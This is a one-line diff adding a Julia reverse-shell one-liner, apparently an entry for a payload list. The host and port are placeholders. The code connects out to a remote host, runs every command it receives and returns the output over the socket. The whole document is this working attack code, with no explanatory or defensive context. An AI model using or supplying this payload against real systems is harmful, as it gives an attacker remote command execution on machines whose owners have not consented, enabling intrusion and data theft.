@@ -1,0 +1,1 @@
+julia -e 'using Sockets; sock = connect("*\host*", parse(Int64,"*\port*")); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'
